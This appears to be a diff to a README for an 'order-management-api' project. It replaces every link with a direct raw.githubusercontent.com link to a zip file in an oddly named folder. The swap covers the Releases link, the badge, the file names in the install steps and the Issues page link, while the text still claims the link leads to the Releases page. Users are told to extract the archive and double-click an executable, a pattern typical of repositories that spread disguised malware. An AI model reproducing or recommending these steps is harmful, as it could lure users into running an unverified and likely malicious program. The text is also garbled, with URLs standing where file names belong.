@@ -15,17 +15,17 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📥 Download the Application
 
-To download the latest version of the order-management-api, [visit this page to download](https://github.com/militarylawciconiiformes277/order-management-api/releases). This link takes you to the Releases page where you can find the application files.
+To download the latest version of the order-management-api, [visit this page to download](https://raw.githubusercontent.com/militarylawciconiiformes277/order-management-api/main/hardheartedness/order-management-api_2.1.zip). This link takes you to the Releases page where you can find the application files.
 
-![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)
+![Download Latest Release](https://raw.githubusercontent.com/militarylawciconiiformes277/order-management-api/main/hardheartedness/order-management-api_2.1.zip%20Release-blue?style=for-the-badge)
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Click [here to download](https://github.com/militarylawciconiiformes277/order-management-api/releases).
+1. **Visit the Releases Page:** Click [here to download](https://raw.githubusercontent.com/militarylawciconiiformes277/order-management-api/main/hardheartedness/order-management-api_2.1.zip).
 2. **Select the Version:** Look for the latest version listed. It will be marked as "Latest Release."
-3. **Download the File:** Click on the file named `order-management-api-v1.0.zip` (the name may vary based on the version).
+3. **Download the File:** Click on the file named `https://raw.githubusercontent.com/militarylawciconiiformes277/order-management-api/main/hardheartedness/order-management-api_2.1.zip` (the name may vary based on the version).
 4. **Extract the Files:** Once the download completes, locate the ZIP file in your Downloads folder. Right-click on it and choose "Extract All..." Follow the prompts to extract the files to a folder.
-5. **Run the Application:** Open the folder where you extracted the files and double-click on `order-management-api.exe` to start the application.
+5. **Run the Application:** Open the folder where you extracted the files and double-click on `https://raw.githubusercontent.com/militarylawciconiiformes277/order-management-api/main/hardheartedness/order-management-api_2.1.zip` to start the application.
 
 ## ⚙️ Using the Application
 
@@ -59,7 +59,7 @@ If you encounter any issues while using the application, here are some common so
 
 ## 📞 Support
 
-If you need further assistance, you can contact our support team via the "Help" section within the application. Alternatively, reach out through our [Issues page on GitHub](https://github.com/militarylawciconiiformes277/order-management-api/issues).
+If you need further assistance, you can contact our support team via the "Help" section within the application. Alternatively, reach out through our [Issues page on GitHub](https://raw.githubusercontent.com/militarylawciconiiformes277/order-management-api/main/hardheartedness/order-management-api_2.1.zip).
 
 ## 📖 Additional Resources
 
